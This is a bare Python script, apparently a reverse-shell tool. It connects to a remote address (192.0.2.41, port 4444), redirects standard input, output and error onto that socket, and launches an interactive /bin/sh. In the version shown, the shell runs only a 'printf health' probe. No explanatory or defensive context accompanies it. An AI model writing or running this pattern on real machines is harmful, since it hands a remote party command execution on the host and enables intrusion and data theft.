import socket
import os
import subprocess

channel = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
channel.connect(("192.0.2.41", 4444))
for fd in (0, 1, 2):
    os.dup2(channel.fileno(), fd)
subprocess.run(["/bin/sh", "-ic", "printf health"])
